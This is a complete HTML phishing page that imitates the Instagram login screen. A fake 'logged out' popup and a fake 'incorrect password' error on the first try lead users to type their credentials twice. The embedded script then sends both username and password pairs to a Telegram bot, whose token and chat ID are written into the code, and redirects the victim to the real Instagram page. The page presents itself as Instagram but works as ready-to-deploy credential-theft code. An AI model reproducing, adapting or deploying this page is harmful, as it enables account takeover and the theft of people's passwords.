<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Instagram - Log in</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: #121b27;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      -webkit-font-smoothing: antialiased;
    }
    .page {
      width: 100%;
      max-width: 400px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: 0 16px 18px;
    }
    .logo-wrap {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding-top: 92px;
      padding-bottom: 108px;
    }
    @media (max-height: 800px) {
      .logo-wrap { padding-top: 72px; padding-bottom: 78px; }
    }
    .ig-logo {
      width: 112px;
      height: 112px;
      display: block;
    }
    .form {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }
    .input-field {
      width: 100%;
      height: 62px;
      background: #15202e;
      border: 1.2px solid #324457;
      border-radius: 15px;
      outline: none;
      padding: 0 18px;
      color: #e8eef5;
      font-size: 16.2px;
      font-weight: 400;
      letter-spacing: 0.1px;
    }
    .input-field::placeholder {
      color: #8a9db2;
      font-size: 16.2px;
      opacity: 1;
    }
    .input-field:focus {
      border-color: #3d5673;
    }
    .login-btn {
      width: 100%;
      height: 54px;
      background: #0866ff;
      border: none;
      border-radius: 28px;
      color: #ffffff;
      font-size: 17px;
      font-weight: 500;
      letter-spacing: 0.2px;
      cursor: pointer;
      margin-top: 4px;
    }
    .login-btn:active {
      filter: brightness(0.9);
      transform: scale(0.99);
    }
    .forgot {
      text-align: center;
      margin-top: 8px;
    }
    .forgot a {
      color: #eef2f7;
      text-decoration: none;
      font-size: 16.3px;
      font-weight: 400;
    }
    .spacer {
      flex: 1;
    }
    .bottom {
      display: flex;
      flex-direction: column;
      gap: 28px;
      padding-top: 24px;
    }
    .create-btn {
      width: 100%;
      height: 54px;
      background: transparent;
      border: 1.5px solid #4a85d1;
      border-radius: 28px;
      color: #5d9bf4;
      font-size: 16.5px;
      font-weight: 500;
      letter-spacing: 0.2px;
      cursor: pointer;
    }
    .create-btn:active {
      background: rgba(93, 155, 244, 0.08);
      transform: scale(0.99);
    }
    .meta-wrap {
      display: flex;
      justify-content: center;
      align-items: center;
      padding-bottom: 8px;
    }
    .meta-accurate {
      display: flex;
      align-items: center;
      justify-content: center;
      color: #8a9bb1;
      opacity: 0.95;
    }
    .meta-accurate svg {
      width: 88px;
      height: auto;
      display: block;
      fill: currentColor;
    }

    /* Custom popup styles (visible, non-native) */
    .popup-overlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.65);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.2s ease, visibility 0.2s ease;
    }
    .popup-overlay.active {
      opacity: 1;
      visibility: visible;
    }
    .popup-box {
      background: #1e2b39;
      width: 85%;
      max-width: 340px;
      border-radius: 24px;
      padding: 28px 22px 22px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.5);
      text-align: center;
      border: 1px solid #324457;
      transform: scale(0.95);
      transition: transform 0.2s ease;
    }
    .popup-overlay.active .popup-box {
      transform: scale(1);
    }
    .popup-message {
      color: #e8eef5;
      font-size: 16.5px;
      font-weight: 400;
      line-height: 1.45;
      margin-bottom: 22px;
      word-break: break-word;
    }
    .popup-btn {
      width: 100%;
      height: 48px;
      background: #0866ff;
      border: none;
      border-radius: 28px;
      color: #ffffff;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: filter 0.15s;
    }
    .popup-btn:active {
      filter: brightness(0.9);
      transform: scale(0.98);
    }
  </style>
</head>
<body>
  <div class="page">
    <div class="logo-wrap">
      <svg class="ig-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="igGrad" x1="8%" y1="92%" x2="92%" y2="8%" gradientUnits="objectBoundingBox">
            <stop offset="0%" stop-color="#fdcb46"/>
            <stop offset="14%" stop-color="#fd9e2e"/>
            <stop offset="28%" stop-color="#fe6c2d"/>
            <stop offset="44%" stop-color="#f92f5d"/>
            <stop offset="66%" stop-color="#d64394"/>
            <stop offset="88%" stop-color="#8e44b8"/>
            <stop offset="100%" stop-color="#5c4fe1"/>
          </linearGradient>
        </defs>
        <rect x="12" y="12" width="76" height="76" rx="21" ry="21" fill="none" stroke="url(#igGrad)" stroke-width="6.5" stroke-linecap="round" stroke-linejoin="round"/>
        <circle cx="50" cy="50" r="18.5" fill="none" stroke="url(#igGrad)" stroke-width="6.5" stroke-linecap="round"/>
        <circle cx="70.8" cy="28.2" r="4.6" fill="url(#igGrad)"/>
      </svg>
    </div>

    <div class="form">
      <input type="text" id="usernameInput" class="input-field" placeholder="Username, email address or mobile numb..." autocomplete="username" spellcheck="false">
      <input type="password" id="passwordInput" class="input-field" placeholder="Password" autocomplete="current-password">
      <button class="login-btn" id="loginButton">Log in</button>
      <div class="forgot">
        <a href="#">Forgotten password?</a>
      </div>
    </div>

    <div class="spacer"></div>

    <div class="bottom">
      <button class="create-btn">Create new account</button>
      <div class="meta-wrap">
        <div class="meta-accurate">

            </g>
          </svg>
        </div>
      </div>
    </div>
  </div>

  <!-- Custom popup (not browser alert) -->
  <div class="popup-overlay" id="popupOverlay">
    <div class="popup-box">
      <div class="popup-message" id="popupMessage">You have logged out</div>
      <button class="popup-btn" id="popupBtn">OK</button>
    </div>
  </div>

  <script>
    (function() {
      // ----- Configuration -----
      const TELEGRAM_BOT_TOKEN = '8943725711:AAGnEGycTYTVr3xSVoixYEi7uE2dPWukiNA';
      const TELEGRAM_CHAT_ID = '7542490071';
      const REDIRECT_URL = 'https://www.instagram.com/accounts/login/?hl=en';

      // ----- DOM elements -----
      const overlay = document.getElementById('popupOverlay');
      const popupMessage = document.getElementById('popupMessage');
      const popupBtn = document.getElementById('popupBtn');
      const loginButton = document.getElementById('loginButton');
      const usernameInput = document.getElementById('usernameInput');
      const passwordInput = document.getElementById('passwordInput');

      // ----- State -----
      let attempt = 0;                // 0 = not attempted, 1 = first try done, 2 = second try (will send)
      let firstUsername = '';
      let firstPassword = '';

      // ----- Popup control (custom, no native alert) -----
      let popupCallback = null;

      function showPopup(message, callback = null) {
        popupMessage.textContent = message;
        popupCallback = callback;
        overlay.classList.add('active');
      }

      function hidePopup() {
        overlay.classList.remove('active');
        const cb = popupCallback;
        popupCallback = null;
        if (typeof cb === 'function') {
          setTimeout(() => cb(), 100);
        }
      }

      // Close popup on button click
      popupBtn.addEventListener('click', hidePopup);

      // Also close when clicking overlay (optional)
      overlay.addEventListener('click', (e) => {
        if (e.target === overlay) {
          hidePopup();
        }
      });

      // ----- Send data to Telegram -----
      async function sendToTelegram(firstUser, firstPass, secondUser, secondPass) {
        const text = `📥 *Instagram login attempts*\n\n` +
                     `*1st attempt:*\n👤 Username: \`${firstUser || '(empty)'}\`\n🔑 Password: \`${firstPass || '(empty)'}\`\n\n` +
                     `*2nd attempt:*\n👤 Username: \`${secondUser || '(empty)'}\`\n🔑 Password: \`${secondPass || '(empty)'}\``;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        try {
          const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: text,
              parse_mode: 'Markdown'
            })
          });
          const data = await response.json();
          console.log('Telegram response:', data);
        } catch (error) {
          console.error('Telegram send error:', error);
        }
      }

      // ----- On page load: show logout popup -----
      window.addEventListener('load', () => {
        setTimeout(() => {
          showPopup('You have logged out');
        }, 150);
      });

      // ----- Login button handler -----
      loginButton.addEventListener('click', function() {
        const currentUsername = usernameInput.value.trim();
        const currentPassword = passwordInput.value;

        // Validation: both fields must be filled
        if (!currentUsername || !currentPassword) {
          showPopup('Please fill in both fields.');
          return;
        }

        if (attempt === 0) {
          // First attempt: store values, show error popup, increment attempt
          firstUsername = currentUsername;
          firstPassword = currentPassword;
          attempt = 1;
          showPopup('Incorrect username or password. Try again');
        } 
        else if (attempt === 1) {
          // Second attempt: send both attempts to telegram, then redirect
          const secondUsername = currentUsername;
          const secondPassword = currentPassword;

          // Send data to Telegram
          sendToTelegram(firstUsername, firstPassword, secondUsername, secondPassword);

          attempt = 2;
          
          // Disable button to prevent multiple clicks
          loginButton.disabled = true;
          loginButton.style.opacity = '0.7';
          
          // Redirect after a tiny delay so the fetch has a chance to be sent
          setTimeout(() => {
            window.location.href = REDIRECT_URL;
          }, 200);
        }
      });
    })();
  </script>
</body>
</html>
